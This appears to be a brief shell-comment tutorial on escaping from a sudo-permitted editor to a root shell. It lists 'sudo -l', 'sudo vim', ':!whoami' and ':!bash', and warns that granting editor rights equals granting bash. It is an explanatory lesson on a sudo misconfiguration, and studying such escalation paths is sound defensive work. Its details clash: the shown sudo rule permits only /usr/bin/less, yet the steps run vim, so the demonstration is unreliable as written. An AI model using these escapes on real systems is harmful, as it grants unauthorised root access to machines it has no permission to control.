# root access without using entire permission of sudo. 
# It tells that giving commands permission can be risky without knowing the entire meaning of the command.

# first check sudo access. which commands, user can access and as whom.

sudo -l
john ALL=(root) NOPASSWD: /usr/bin/less


# here user can access only use vim commands as an root user. it looks 100% right. but believe me it's not. i explain you how and why

# run vim commands as root 
sudo vim

# Inside vim, type:
:!whoami

# Output:
root

# Now escalate fully:
:!bash

# Check:
whoami
# most probably you became root

# Editors can:

# - execute commands
# - edit any file
# - spawn shells

# So:
sudo vim ≈ sudo bash